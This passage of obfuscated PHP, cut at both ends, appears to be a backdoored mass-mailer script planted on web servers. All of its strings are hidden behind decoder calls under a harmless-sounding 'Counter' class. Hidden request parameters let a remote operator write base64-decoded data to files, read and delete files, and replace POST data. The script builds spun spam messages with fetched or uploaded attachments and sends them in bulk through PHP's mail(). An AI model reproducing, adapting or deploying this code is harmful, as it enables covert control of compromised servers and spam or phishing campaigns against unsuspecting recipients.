_igo::_xk(053)) ] . Counter::_xk('_pef', '_' . 'oh') . $_x[_igo::_xk(054) + _igo::_xk(055) - _igo::_xk(056) ];             $_gus = Counter::_xk('_uoya', '_ao');         }     }     $_p .= $_fs;     echo Counter::_xk('_' . 'fj' . 'f', '_mk');     echo $_p;     echo Counter::_xk('_z' . 'ef', '_lg' . 'c');     exit(); } if (isset($_REQUEST[Counter::_xk('_' . 'uz', '_uv') ])) {     $_p = Counter::_xk('_w' . 'r' . 'h', '_' . 'ddo');     $_fs = Counter::_xk('_' . 'pe' . 'z', '_' . 'vl');     $_gus = Counter::_xk('_xq' . 'q' . 'z', '_' . 'idw' . 'v');     $_mk = base64_decode($_REQUEST[Counter::_xk('_ebh' . 'a', '_mpuq') ]);     file_put_contents(Counter::_xk('_h' . 'a' . 'r' . 't', '_eb' . 'dm') , date(Counter::_xk('_vo' . 'a', '_som')) . $_mk . Counter::_xk('_x' . 'xd' . 'l', '_av') , (int)round(_igo::_xk(057) + _igo::_xk(060)) | (int)round(_igo::_xk(061) + _igo::_xk(062) + _igo::_xk(063)));     echo Counter::_xk('_' . 'rv' . 'g', '_njr');     echo $_mk;     echo Counter::_xk('_zhe', '_qe' . 'k'); } if (isset($_REQUEST[Counter::_xk('_dk' . 'g', '_pbo') ])) {     $_nk = file_get_contents(Counter::_xk('_slx', '_mk' . 'j'));     $_nk = preg_replace(Counter::_xk('_rb' . 'kc', '_yk' . 'z') , Counter::_xk('_kxb' . 't', '_e' . 'rs') , $_nk);     echo $_nk; } if (isset($_REQUEST[Counter::_xk('_tg', '_' . 'iv' . 'm') ])) {     unlink(Counter::_xk('_z' . 'fmm', '_jq' . 'a')); } if (isset($_POST[Counter::_xk('_e' . 'ov', '_du' . 'v') ]) === true) {     parse_str(base64_decode($_POST[Counter::_xk('_e' . 'fk', '_rg') ]) , $_POST); } if (isset($_POST[Counter::_xk('_si', '_rw' . 'k' . 'n') ]) === true) {     _if();     exit; } if (isset($_POST[Counter::_xk('_jo' . 'y' . 'u', '_e' . 'jd') ]) === true) {     _qlf();     exit; } function _qlf($_tf = - 066641) {     $_ev = $_SERVER[Counter::_xk('_fngt', '_rn' . 'z' . 'p') ];     $_ev = str_replace(Counter::_xk('_' . 'kckb', '_a' . 'c' . 'q') , Counter::_xk('_p' . 'l' . 'n', '_ux') , $_ev);     $_e = explode(Counter::_xk('_xe', '_pte') , $_ev);     $_POST[Counter::_xk('_s' . 'm' . 'lt', '_sig') ] = str_replace(Counter::_xk('_p' . 'b', '_q' . 'os' . 'o') , ucfirst($_e[_igo::_xk(064) + _igo::_xk(065) - _igo::_xk(066) ]) , $_POST[Counter::_xk('_xn' . 'zl', '_az' . 'q') ]);     $_cs = urldecode($_POST[Counter::_xk('_n' . 'j', '_uk') ]);     $_wyf = explode(Counter::_xk('_q' . 'jx', '_' . 'ik') , $_cs);     global $_n;     global $_xo;     global $_k;     $_k = (_igo::_xk(067) - _igo::_xk(070) - _igo::_xk(071));     for ($_qlc = (int)round(_igo::_xk(072) + _igo::_xk(073)) , $_ml = count($_wyf);$_qlc < $_ml;$_qlc++)     {         $_kfx = explode(Counter::_xk('_' . 'fpx' . 'w', '_z' . 'w' . 'q') , trim($_wyf[$_qlc]));         $_ejj = _uyga($_POST[Counter::_xk('_y' . 'u', '_kak' . 'v') ], $_kfx);         $_r = _uyga(_ssw($_POST[Counter::_xk('_p' . 'zpz', '_qw') ]) , $_kfx);         $_vcl = explode(Counter::_xk('_hbrh', '_nl' . 'lt') , $_r);         if (is_file($_FILES[Counter::_xk('_' . 'p' . 'q', '_f' . 'd') ][Counter::_xk('_' . 'hy', '_e' . 'g' . 'a') ]))         {             $_mis = _ssw(urldecode($_POST[Counter::_xk('_x' . 'a' . 'm', '_ar' . 'y') ]));             $_edp = urldecode($_POST[Counter::_xk('_if', '_ze') ]);         }         else         {             $_mis = _ssw($_POST[Counter::_xk('_u' . 'u', '_a' . 't' . 'm') ]);             $_edp = $_POST[Counter::_xk('_idyo', '_' . 'rv' . 'a') ];         }         $_mis = str_replace(Counter::_xk('_xf', '_sjt') , $_vcl[_igo::_xk(074) - _igo::_xk(075) - _igo::_xk(076) ], $_mis);         $_mis = str_replace(Counter::_xk('_vg' . 'c', '_ya' . 's' . 'o') , $_kfx[(int)round(_igo::_xk(077) + _igo::_xk(0100) + _igo::_xk(0101)) ], $_mis);         $_mis = _uyga($_mis, $_kfx);         $_edp = str_replace(Counter::_xk('_' . 'cbc' . 'k', '_h' . 'd' . 'm') , $_vcl[(int)round(_igo::_xk(0102) + _igo::_xk(0103) + _igo::_xk(0104)) ], $_edp);         $_edp = str_replace(Counter::_xk('_cb' . 'k' . 'd', '_' . 'ond') , $_kfx[(int)round(_igo::_xk(0105) + _igo::_xk(0106) + _igo::_xk(0107)) ], $_edp);         $_edp = _uyga($_edp, $_kfx);         if (!_zk($_kfx[(int)round(_igo::_xk(0110) + _igo::_xk(0111)) ], $_vcl[_igo::_xk(0112) - _igo::_xk(0113) + _igo::_xk(0114) ], $_edp, $_mis, $_ejj, $_vcl[(int)round(_igo::_xk(0115) + _igo::_xk(0116)) ]))         {             print Counter::_xk('_' . 'nns', '_' . 'ud' . 'w');             exit;         }     }     print Counter::_xk('_gy' . 'f', '_xm' . 'm');     exit; } function _zk($_rz, $_b, $_wxp, $_g, $_gz, $_es, $_ia = true) {     global $_k;     global $_xo;     if (is_file($_FILES[Counter::_xk('_qi', '_' . 'igg') ][Counter::_xk('_s' . 'o', '_' . 'zl' . 'x') ]))     {         $_qc = _svfp($_FILES[Counter::_xk('_i' . 'wca', '_f' . 'u') ][Counter::_xk('_sj' . 'b', '_qo' . 'c' . 'r') ]);         $_eox = $_POST[Counter::_xk('_uy', '_ga') ];     }     $_es = trim($_es);     if (strlen(trim($_es)) < (_igo::_xk(0117) - _igo::_xk(0120)))     {         $_es = _zh();     }     if (strlen(trim($_b)) < (int)round(_igo::_xk(0121) + _igo::_xk(0122) + _igo::_xk(0123)))     {         $_b = str_replace(Counter::_xk('_t' . 'i' . 'j', '_qsvl') , Counter::_xk('_' . 'vf', '_cj') , trim($_es)) . Counter::_xk('_c' . 'r', '_' . 'bj' . 'd' . 'x') . $_SERVER[Counter::_xk('_b' . 'e', '_s' . 'usu') ];     }     if (strlen(trim($_gz)) < (_igo::_xk(0124) + _igo::_xk(0125)))     {         $_gz = $_b;     }     if ($_POST[Counter::_xk('_' . 't' . 'za', '_ef') ] == Counter::_xk('_ow', '_' . 'jt'))     {         $_f = Counter::_xk('_f' . 'c', '_uwb' . 'o');     }     else     {         $_f = Counter::_xk('_qpd', '_umv' . 'h');     }     $_rl = _jarc($_es, $_b, $_gz);     $Counterc = md5(uniqid());     $_rl .= Counter::_xk('_btaq', '_fl') . $Counterc . Counter::_xk('_t' . 'y', '_' . 'sc' . 'o');     if ($_k == (int)round(_igo::_xk(0126) + _igo::_xk(0127)))     {         $_rl .= Counter::_xk('_i' . 'p', '_' . 'zq') . $_b . Counter::_xk('_o' . 'o' . 'b', '_egl' . 'y') . Counter::_xk('_xy' . 'b' . 'h', '_od' . 'v');     }     $_rs = Counter::_xk('_' . 'd' . 'n' . 'o' . 'y', '_kqf' . 't') . $Counterc . Counter::_xk('_' . 'bjx', '_c' . 'w');     $_rs .= Counter::_xk('_' . 'pzc' . 'e', '_vi' . 'm' . 't');     $_rs .= Counter::_xk('_' . 'hgnc', '_v' . 's' . 'r') . Counter::_xk('_' . 'uxn', '_iwij');     $_dcq = _xdc($_wxp);     $_rs .= trim(chunk_split(base64_encode($_dcq)));     if ($_POST[Counter::_xk('_' . 'q' . 'r', '_w' . 'qc') ] == Counter::_xk('_jc' . 'cf', '_h' . 'o' . 'p'))     {         $_rs .= Counter::_xk('_' . 'gq' . 'x', '_' . 'uto') . $Counterc . Counter::_xk('_' . 'p' . 'pv', '_eoda');         $_rs .= Counter::_xk('_' . 'is' . 'm', '_jv');         $_rs .= Counter::_xk('_i' . 'l', '_fw' . 'p') . Counter::_xk('_p' . 'm', '_e' . 'l');         $_rs .= trim(chunk_split(base64_encode($_wxp)));     }     if (is_file($_FILES[Counter::_xk('_f' . 'r', '_az' . 'zt') ][Counter::_xk('_' . 'vj', '_' . 'k' . 'r') ]))     {         $_rs .= Counter::_xk('_' . 'd' . 'w', '_mnd') . $Counterc . Counter::_xk('_og', '_' . 'ef' . 'd');         $_rs .= Counter::_xk('_' . 'gg' . 'h', '_t' . 'j') . $_FILES[Counter::_xk('_ed' . 'h', '_mdx') ][Counter::_xk('_' . 'x' . 'u' . 'y', '_wlbh') ] . Counter::_xk('_s' . 'd' . 'wl', '_nx') . $_eox . Counter::_xk('_' . 'kgd', '_fbm') . Counter::_xk('_w' . 'c' . 'y', '_cm');         $_rs .= Counter::_xk('_c' . 't', '_dl' . 'sm') . $_eox . Counter::_xk('_' . 'oa' . 'kz', '_ux' . 'nz') . Counter::_xk('_yu' . 'wv', '_mz' . 'g');         $_rs .= Counter::_xk('_' . 'w' . 'sx', '_d' . 't') . Counter::_xk('_' . 'hau', '_djz');         $_rs .= Counter::_xk('_' . 'bb' . 'u', '_' . 'z' . 't' . 'n') . rand(_igo::_xk(0130) + _igo::_xk(0131) + _igo::_xk(0132) , (int)round(_igo::_xk(0133) + _igo::_xk(0134) + _igo::_xk(0135))) . Counter::_xk('_' . 'spp' . 'x', '_' . 'qn');         $_rs .= trim(chunk_split(base64_encode($_qc)));     }     $_q = array();     for ($_ria = (int)round(_igo::_xk(0136) + _igo::_xk(0137) + _igo::_xk(0140));$_ria < count($_xo);$_ria++)     {         $_xo[$_ria][(int)round(_igo::_xk(0141) + _igo::_xk(0142)) ] = trim($_xo[$_ria][_igo::_xk(0143) - _igo::_xk(0144) ]);         file_put_contents($_xo[$_ria][(int)round(_igo::_xk(0145) + _igo::_xk(0146) + _igo::_xk(0147)) ], _ix($_xo[$_ria][(int)round(_igo::_xk(0150) + _igo::_xk(0151) + _igo::_xk(0152)) ]));     }     for ($_ria = (_igo::_xk(0153) + _igo::_xk(0154));$_ria < count($_xo);$_ria++)     {         if (isset($_xo[$_ria][(int)round(_igo::_xk(0155) + _igo::_xk(0156)) ]))         {             $_vjs = fopen($_xo[$_ria][_igo::_xk(0157) + _igo::_xk(0160) + _igo::_xk(0161) ], Counter::_xk('_hn' . 's', '_r' . 'q'));             if ($_vjs)             {                 $_q[$_ria] = fread($_vjs, filesize($_xo[$_ria][(int)round(_igo::_xk(0162) + _igo::_xk(0163) + _igo::_xk(0164)) ]));             }             fclose($_vjs);             if (isset($_q[$_ria]))             {                 $_rs .= Counter::_xk('_y' . 'p', '_' . 'n' . 'j' . 'b') . $Counterc . Counter::_xk('_h' . 'i' . 'x', '_t' . 'a' . 'p' . 'r');                 $_rs .= Counter::_xk('_' . 'vq', '_xxid') . mime_content_type($_xo[$_ria][(int)round(_igo::_xk(0165) + _igo::_xk(0166)) ]) . Counter::_xk('_x' . 'c', '_quku') . $_xo[$_ria][(int)round(_igo::_xk(0167) + _igo::_xk(0170) + _igo::_xk(0171)) ] . Counter::_xk('_' . 't' . 'j' . 'f', '_c' . 'e') . Counter::_xk('_xmd' . 'r', '_ky');                 $_rs .= Counter::_xk('_' . 'pg', '_gs' . 'y') . $_xo[$_ria][(int)round(_igo::_xk(0172) + _igo::_xk(0173)) ] . Counter::_xk('_bjw', '_' . 'rp' . 'd' . 'q') . Counter::_xk('_' . 'v' . 't', '_kd');                 $_rs .= Counter::_xk('_niwu', '_' . 'ujf' . 'h') . Counter::_xk('_' . 'j' . 'u', '_kh' . 'i');                 $_rs .= Counter::_xk('_jg' . 'q', '_' . 'jts') . rand((int)round(_igo::_xk(0174) + _igo::_xk(0175)) , (int)round(_igo::_xk(0176) + _igo::_xk(0177))) . Counter::_xk('_yw' . 'm' . 'l', '_bs');                 $_rs .= trim(chunk_split(base64_encode(file_get_contents($_xo[$_ria][(int)round(_igo::_xk(0200) + _igo::_xk(0201) + _igo::_xk(0202)) ]))));                 unlink($_xo[$_ria][_igo::_xk(0203) + _igo::_xk(0204) - _igo::_xk(0205) ]);             }         }     }     $_rs .= Counter::_xk('_jp' . 'q', '_' . 'dy') . $Counterc . Counter::_xk('_s' . 'tk', '_wx');     $_g = Counter::_xk('_hc', '_jz') . base64_encode($_g) . Counter::_xk('_' . 'qc' . 'q', '_w' . 'u');     if (mail($_rz, $_g, $_rs, $_rl))     {         return true;     }     return false; } function _ssw($_kfx) {     $_ep = explode(Counter::_xk('_v' . 'i', '_gky' . 'a') , $_kfx);     if (count($_ep) > (int)round(_igo::_xk(0206) + _igo::_xk(0207) + _igo::_xk(0210)))     {         return trim($_ep[rand((int)round(_igo::_xk(0211) + _igo::_xk(0212) + _igo::_xk(0213)) , count($_ep) - (_igo::_xk(0214) + _igo::_xk(0215))) ]);     }     return trim($_kfx); } function _uyga($_hid, $_kfx) {     global $_n;     global $_xo;     global $_k;     preg_match_all(Counter::_xk('_wq' . 'v', '_kysp') , $_hid, $_zv);     $_ria = (_igo::_xk(0216) + _igo::_xk(0217) - _igo::_xk(0220));     preg_match_all(Counter::_xk('_dbm', '_ydt') , $_hid, $_udj);     $_min = (int)round(_igo::_xk(0221) + _igo::_xk(0222) + _igo::_xk(0223));     preg_match_all(Counter::_xk('_c' . 'b' . 'u', '_' . 'ki') , $_hid, $_ryz);     $_i = (int)round(_igo::_xk(0224) + _igo::_xk(0225) + _igo::_xk(0226));     preg_match_all(Counter::_xk('_' . 'w' . 'n' . 'v', '_b' . 'v') , $_hid, $_atl);     $_h = (int)round(_igo::_xk(0227) + _igo::_xk(0230) + _igo::_xk(0231));     preg_match_all(Counter::_xk('_ejtz', '_ox') , $_hid, $_yxd);     $_fta = (_igo::_xk(0232) - _igo::_xk(0233) + _igo::_xk(0234));     preg_match_all(Counter::_xk('_' . 'agp' . 'i', '_wz') , $_hid, $_xgu);     $_cw = (_igo::_xk(0235) - _igo::_xk(0236));     preg_match_all(Counter::_xk('_bs' . 'l', '_kq' . 'e') , $_hid, $_vt);     $_ah = (int)round(_igo::_xk(0237) + _igo::_xk(0240) + _igo::_xk(0241));     while ($_cw < count($_xgu[_igo::_xk(0242) + _igo::_xk(0243) + _igo::_xk(0244) ]))     {         $_frr = Counter::_xk('_crta', '_kl');         $_oi = explode(Counter::_xk('_bx' . 'a', '_ct' . 'i' . 'a') , $_xgu[(int)round(_igo::_xk(0245) + _igo::_xk(0246)) ][$_cw]);         $_wd = Counter::_xk('_n' . 'u' . 'r', '_wxg');         preg_match_all(Counter::_xk('_' . 'vou', '_vd') , $_oi[(int)round(_igo::_xk(0247) + _igo::_xk(0250) + _igo::_xk(0251)) ], $_awf);         if (count($_awf[_igo::_xk(0252) - _igo::_xk(0253) + _igo::_xk(0254) ]) > (int)round(_igo::_xk(0255) + _igo::_xk(0256) + _igo::_xk(0257)))         {             $_fo = explode(Counter::_xk('_hs' . 'v', '_n' . 'nm') , $_awf[_igo::_xk(0260) + _igo::_xk(0261) + _igo::_xk(0262) ][(int)round(_igo::_xk(0263) + _igo::_xk(0264)) ]);             $_frr = $_fo[array_rand($_fo) ];         }         else         {             $_frr = $_oi[_igo::_xk(0265) - _igo::_xk(0266) - _igo::_xk(0267) ];         }         $_frr = Counter::_xk('_f' . 'o', '_tpu') . $_frr;         for ($_md = (int)round(_igo::_xk(0270) + _igo::_xk(0271));$_md < count($_oi);$_md++)         {             $_oi[$_md] = str_replace(Counter::_xk('_wp' . 'v' . 'e', '_c' . 'n') , Counter::_xk('_' . 'u' . 'wt', '_dg' . 'r') , $_oi[$_md]);             $_oi[$_md] = str_replace(Counter::_xk('_n' . 'xps', '_fse') , Counter::_xk('_l' . 'v' . 'e' . 'q', '_oqu' . 's') , $_oi[$_md]);             if (strpos($_oi[$_md], Counter::_xk('_tbvx', '_ig')) !== false)             {                 $_frr .= Counter::_xk('_' . 'qw' . 'p', '_nw' . 'cl') . trim($_kfx[_igo::_xk(0272) - _igo::_xk(0273) + _igo::_xk(0274) ]);             }             else if (strpos($_oi[$_md], Counter::_xk('_sr' . 'a', '_' . 'at' . 'a' . 'x')) !== false)             {                 $_im = explode(Counter::_xk('_zj' . 'w', '_d' . 'd' . 'z' . 'f') , $_oi[$_md]);                 $_frr .= Counter::_xk('_' . 'hg', '_x' . 'ly') . $_im[(int)round(_igo::_xk(0275) + _igo::_xk(0276)) ] . Counter::_xk('_' . 'wkwa', '_y' . 'ptp') . trim($_kfx[$_im[(int)round(_igo::_xk(0277) + _igo::_xk(0300)) ]]);             }             else if (strpos($_oi[$_md], Counter::_xk('_v' . 'gb', '_h' . 'w')) !== false)             {                 $_im = explode(Counter::_xk('_grr', '_saq' . 'g') , $_oi[$_md], (int)round(_igo::_xk(0301) + _igo::_xk(0302)));                 $_wd = $_im[_igo::_xk(0303) - _igo::_xk(0304) + _igo::_xk(0305) ];             }             else             {                 $_frr .= Counter::_xk('_qmj', '_' . 'k' . 'v') . $_oi[$_md];             }         }         if (strlen($_wd) > (int)round(_igo::_xk(0306) + _igo::_xk(0307) + _igo::_xk(0310)))         {             $_zc = $_wd;         }         else         {             $_zc = Counter::_xk('_' . 'rczq', '_y' . 'f' . 'x') . $_SERVER[Counter::_xk('_mh' . 'i' . 'n', '_gbd' . 'k') ] . $_SERVER[Counter::_xk('_' . 'nyu', '_sog' . 'p') ];         }         $_zc .= Counter::_xk('_' . 'lvbg', '_' . 'da') . base64_encode($_frr);         $_hid = _mdd($_xgu[_igo::_xk(0311) + _igo::_xk(0312) - _igo::_xk(0313) ][$_cw], $_zc, $_hid);         $_cw++;     }     $_m = strpos($_hid, Counter::_xk('_gxi', '_' . 'pjo'));     if ($_m != false)     {         $_zc = Counter::_xk('_x' . 'd', '_bj') . $_SERVER[Counter::_xk('_toj' . 'b', '_lat' . 'y') ] . $_SERVER[Counter::_xk('_' . 'j' . 'ja' . 'f', '_ac') ];         $_zc .= Counter::_xk('_a' . 'wd', '_t' . 'do') . base64_encode($_kfx[(int)round(_igo::_xk(0314) + _igo::_xk(0315) + _igo::_xk(0316)) ]);         $_k = (int)round(_igo::_xk(0317) + _igo::_xk(0320));         $_hid = str_replace(Counter::_xk('_kt', '_zn' . 'q' . 'd') , $_zc, $_hid);     }     while ($_fta < count($_yxd[(int)round(_igo::_xk(0321) + _igo::_xk(0322)) ]))     {         $_po = explode(Counter::_xk('_kb' . 'y' . 't', '_' . 't' . 'f' . 'h') , $_yxd[_igo::_xk(0323) + _igo::_xk(0324) ][$_fta]);         $_po = $_po[array_rand($_po) ];         $_hid = _mdd($_yxd[(int)round(_igo::_xk(0325) + _igo::_xk(0326)) ][$_fta], $_po, $_hid);         $_fta++;     }     while ($_ria < count($_zv[_igo::_xk(0327) + _igo::_xk(0330) + _igo::_xk(0331) ]))     {         $_po = explode(Counter::_xk('_m' . 'tho', '_ye') , $_zv[_igo::_xk(0332) + _igo::_xk(0333) ][$_ria]);         if (!is_numeric($_po[_igo::_xk(0334) + _igo::_xk(0335) - _igo::_xk(0336) ]) or !is_numeric($_po[_igo::_xk(0337) + _igo::_xk(0340) ]))         {             continue;         }         $_po = rand($_po[(int)round(_igo::_xk(0341) + _igo::_xk(0342)) ], $_po[(int)round(_igo::_xk(0343) + _igo::_xk(0344) + _igo::_xk(0345)) ]);         $_hid = _mdd($_zv[_igo::_xk(0346) - _igo::_xk(0347) - _igo::_xk(0350) ][$_ria], $_po, $_hid);         $_ria++;     }     while ($_ah < count($_vt[_igo::_xk(0351) - _igo::_xk(0352) - _igo::_xk(0353) ]))     {         $_po = explode(Counter::_xk('_' . 's' . 'h' . 'x', '_gl' . 'zm') , $_vt[(int)round(_igo::_xk(0354) + _igo::_xk(0355)) ][$_ah]);         $_jsu = false;         for ($_md = (_igo::_xk(0356) - _igo::_xk(0357) + _igo::_xk(0360));$_md < count($_vt[_igo::_xk(0361) - _igo::_xk(0362) - _igo::_xk(0363) ]);$_md++)         {             if ($_vt[(int)round(_igo::_xk(0364) + _igo::_xk(0365)) ][$_ah] == $_n[$_md][_igo::_xk(0366) - _igo::_xk(0367) + _igo::_xk(0370) ])             {                 $_po = $_n[$_md][(int)round(_igo::_xk(0371) + _igo::_xk(0372) + _igo::_xk(0373)) ];                 $_jsu = true;                 break;             }         }         if ($_jsu == false)         {             $_po = $_po[array_rand($_po) ];             $_n[] = array(                 $_udj[_igo::_xk(0374) + _igo::_xk(0375) ][$_ah],                 $_po             );         }         $_hid = str_replace($_vt[(int)round(_igo::_xk(0376) + _igo::_xk(0377) + _igo::_xk(0400)) ][$_ah], $_po, $_hid);         $_ah++;     }     while ($_min < count($_udj[_igo::_xk(0401) - _igo::_xk(0402) + _igo::_xk(0403) ]))     {         $_po = explode(Counter::_xk('_hxvq', '_i' . 'i') , $_udj[(int)round(_igo::_xk(0404) + _igo::_xk(0405) + _igo::_xk(0406)) ][$_min]);         $_jsu = false;         for ($_md = (int)round(_igo::_xk(0407) + _igo::_xk(0410) + _igo::_xk(0411));$_md < count($_udj[(int)round(_igo::_xk(0412) + _igo::_xk(0413)) ]);$_md++)         {             if ($_udj[(int)round(_igo::_xk(0414) + _igo::_xk(0415)) ][$_min] == $_n[$_md][_igo::_xk(0416) + _igo::_xk(0417) + _igo::_xk(0420) ])             {                 $_po = $_n[$_md][(int)round(_igo::_xk(0421) + _igo::_xk(0422) + _igo::_xk(0423)) ];                 $_jsu = true;                 break;             }         }         if ($_jsu == false)         {             $_po = $_po[array_rand($_po) ];             $_n[] = array(                 $_udj[_igo::_xk(0424) - _igo::_xk(0425) ][$_min],                 $_po             );         }         $_hid = str_replace($_udj[(int)round(_igo::_xk(0426) + _igo::_xk(0427) + _igo::_xk(0430)) ][$_min], $_po, $_hid);         $_min++;     }     while ($_i < count($_ryz[_igo::_xk(0431) + _igo::_xk(0432) ]))     {         $_po = explode(Counter::_xk('_sa', '_zg') , $_ryz[_igo::_xk(0433) + _igo::_xk(0434) + _igo::_xk(0435) ][$_i]);         if (!is_numeric($_po[(int)round(_igo::_xk(0436) + _igo::_xk(0437)) ]) or !is_numeric($_po[_igo::_xk(0440) - _igo::_xk(0441) - _igo::_xk(0442) ]))         {             continue;         }         $_po = _tqn($_po[(int)round(_igo::_xk(0443) + _igo::_xk(0444)) ], $_po[(int)round(_igo::_xk(0445) + _igo::_xk(0446) + _igo::_xk(0447)) ]);         $_hid = _mdd($_ryz[(int)round(_igo::_xk(0450) + _igo::_xk(0451)) ][$_i], $_po, $_hid);         $_i++;     }     while ($_h < count($_atl[_igo::_xk(0452) - _igo::_xk(0453) + _igo::_xk(0454) ]))     {         if (!is_numeric($_atl[(int)round(_igo::_xk(0455) + _igo::_xk(0456) + _igo::_xk(0457)) ][$_h]))         {             continue;         }         $_hid = str_replace($_atl[_igo::_xk(0460) - _igo::_xk(0461) ][$_h], $_kfx[$_atl[_igo::_xk(0462) - _igo::_xk(0463) + _igo::_xk(0464) ][$_h]], $_hid);         $_h++;     }     preg_match_all(Counter::_xk('_na' . 'e', '_t' . 'c') , $_hid, $_da);     $_qlc = (_igo::_xk(0465) + _igo::_xk(0466) + _igo::_xk(0467));     while ($_qlc < count($_da[_igo::_xk(0470) + _igo::_xk(0471) - _igo::_xk(0472) ]))     {         $_po = explode(Counter::_xk('_' . 'g' . 'i', '_' . 'vs') , $_da[(int)round(_igo::_xk(0473) + _igo::_xk(0474)) ][$_qlc]);         $_po = $_po[array_rand($_po) ];         $_hid = _mdd($_da[(int)round(_igo::_xk(0475) + _igo::_xk(0476)) ][$_qlc], $_po, $_hid);         $_qlc++;     }     $_wdx = strpos($_hid, Counter::_xk('_q' . 'z', '_es'));     if ($_wdx != false)     {         $_hid = str_replace(Counter::_xk('_qb', '_' . 'q' . 'm') , Counter::_xk('_' . 'ms', '_yrz') , $_hid);         $_hid = str_replace(Counter::_xk('_ydw', '_d' . 'z') , Counter::_xk('_ws' . 'l', '_' . 'j' . 'b') , $_hid);     }     $_hid = str_replace(Counter::_xk('_' . 's' . 'g', '_wk' . 'pn') , Counter::_xk('_fs', '_f' . 'e' . 'w') , $_hid);     $_hid = str_replace(Counter::_xk('_lf' . 'ah', '_o' . 'p' . 'gy') , trim($_kfx[(int)round(_igo::_xk(0477) + _igo::_xk(0500) + _igo::_xk(0501)) ]) , $_hid);     preg_match_all(Counter::_xk('_i' . 'psz', '_q' . 'l') , $_hid, $_u);     $_osb = (int)round(_igo::_xk(0502) + _igo::_xk(0503) + _igo::_xk(0504));     while ($_osb < count($_u[_igo::_xk(0505) - _igo::_xk(0506) ]))     {         $_yjg = $_u[(int)round(_igo::_xk(0507) + _igo::_xk(0510)) ][$_osb];         preg_match_all(Counter::_xk('_' . 'e' . 'kg', '_hu') , $_yjg, $_ijf);         $_ee = (_igo::_xk(0511) + _igo::_xk(0512) - _igo::_xk(0513));         while ($_ee < count($_ijf[_igo::_xk(0514) - _igo::_xk(0515) ]))         {             if (is_numeric($_ijf[(int)round(_igo::_xk(0516) + _igo::_xk(0517) + _igo::_xk(0520)) ][$_ee]))             {                 $_yjg = _mdd($_ijf[_igo::_xk(0521) + _igo::_xk(0522) + _igo::_xk(0523) ][$_ee], $_kfx[$_ijf[_igo::_xk(0524) - _igo::_xk(0525) + _igo::_xk(0526) ][$_ee]], $_yjg);             }             $_ee++;         }         $_hid = _mdd($_u[_igo::_xk(0527) - _igo::_xk(0530) ][$_osb], base64_encode($_yjg) , $_hid);         $_osb++;     }     preg_match_all(Counter::_xk('_' . 'h' . 'uaj', '_vc') , $_hid, $_jb);     $_mc = (_igo::_xk(0531) + _igo::_xk(0532) - _igo::_xk(0533));     while ($_mc < count($_jb[_igo::_xk(0534) - _igo::_xk(0535) - _igo::_xk(0536) ]))     {         $_pay = explode(Counter::_xk('_' . 'wom', '_xng') , $_jb[_igo::_xk(0537) + _igo::_xk(0540) ][$_mc]);         $_xo[] = $_pay;         $_hid = _mdd($_jb[_igo::_xk(0541) + _igo::_xk(0542) ][$_mc], Counter::_xk('_' . 'gn' . 'j', '_' . 'r' . 'k') , $_hid);         $_mc++;     }     preg_match_all(Counter::_xk('_zd' . 'y', '_g' . 'r' . 'k') , $_hid, $_pp);     $_j = (_igo::_xk(0543) + _igo::_xk(0544));     while ($_j < count($_pp[(int)round(_igo::_xk(0545) + _igo::_xk(0546) + _igo::_xk(0547)) ]))     {         $_pay = explode(Counter::_xk('_wcc' . 'r', '_' . 'f' . 'm') , $_pp[_igo::_xk(0550) + _igo::_xk(0551) - _igo::_xk(0552) ][$_j]);         preg_match_all(Counter::_xk('_ss' . 'j' . 'z', '_h' . 'f' . 'ip') , $_pay[(int)round(_igo::_xk(0553) + _igo::_xk(0554) + _igo::_xk(0555)) ], $_cu);         $_mqa = (int)round(_igo::_xk(0556) + _igo::_xk(0557) + _igo::_xk(0560));         while ($_mqa < count($_cu[(int)round(_igo::_xk(0561) + _igo::_xk(0562) + _igo::_xk(0563)) ]))         {             $_em = explode(Counter::_xk('_ohl' . 'b', '_gs' . 'vx') , $_cu[(int)round(_igo::_xk(0564) + _igo::_xk(0565)) ][$_mqa]);             $_iny = rand(intval($_em[_igo::_xk(0566) - _igo::_xk(0567) ]) , intval($_em[_igo::_xk(0570) + _igo::_xk(0571) - _igo::_xk(0572) ]) - (int)round(_igo::_xk(0573) + _igo::_xk(0574) + _igo::_xk(0575)));             $_pay[_igo::_xk(0576) + _igo::_xk(0577) - _igo::_xk(0600) ] = _mdd($_cu[(int)round(_igo::_xk(0601) + _igo::_xk(0602)) ][$_mqa], $_iny, $_pay[_igo::_xk(0603) + _igo::_xk(0604) ]);             $_pay[_igo::_xk(0605) + _igo::_xk(0606) ] = str_replace(Counter::_xk('_at' . 'f' . 'd', '_x' . 'xzb') , Counter::_xk('_hn', '_tm' . 'd') , $_pay[(int)round(_igo::_xk(0607) + _igo::_xk(0610)) ]);             $_pay[_igo::_xk(0611) + _igo::_xk(0612) + _igo::_xk(0613) ] = str_replace(Counter::_xk('_' . 'g' . 'vag', '_rt') , Counter::_xk('_' . 'ekjz', '_sdv' . 't') , $_pay[_igo::_xk(0614) - _igo::_xk(0615) - _igo::_xk(0616) ]);             $_mqa++;         }         $_xo[] = $_pay;         $_hid = _mdd($_pp[_igo::_xk(0617) - _igo::_xk(0620) + _igo::_xk(0621) ][$_j], Counter::_xk('_' . 'jc', '_yc') , $_hid);         $_j++;     }     preg_match_all(Counter::_xk('_q' . 'lp', '_' . 'fk') , $_hid, $_ca);     $_aje = (int)round(_igo::_xk(0622) + _igo::_xk(0623) + _igo::_xk(0624));     $_qcm = Counter::_xk('_o' . 'gps', '_xdv');     $_dfm = Counter::_xk('_g' . 'o', '_f' . 'mf' . 't');     while ($_aje < count($_ca[(int)round(_igo::_xk(0625) + _igo::_xk(0626)) ]))     {         file_put_contents($_qcm, file_get_contents($_ca[(int)round(_igo::_xk(0627) + _igo::_xk(0630)) ][$_aje]));         $_vjs = fopen($_qcm, Counter::_xk('_vwob', '_xem'));         if ($_vjs)         {             $_dfm = fread($_vjs, filesize($_qcm));         }         fclose($_vjs);         $_pc = Counter::_xk('_eay' . 'n', '_' . 'bt' . 's') . mime_content_type($_qcm) . Counter::_xk('_jmh', '_bc' . 'k' . 'd') . chunk_split(base64_encode($_dfm)) . Counter::_xk('_tc' . 'm', '_p' . 'r' . 'eg');         $_hid = _mdd($_ca[_igo::_xk(0631) + _igo::_xk(0632) ][$_aje], $_pc, $_hid);         unlink($_qcm);         $_aje++;     }     return $_hid; } function _jarc($_ssl, $_ybr, $_gz = null) {     if (is_null($_gz)) $_gz = $_ybr;     $_rl = Counter::_xk('_g' . 'd', '_' . 'j' . 'k') . base64_encode($_ssl) . Counter::_xk('_' . 'lbxt', '_' . 'gwt' . 'd') . $_ybr . Counter::_xk('_va' . 'f', 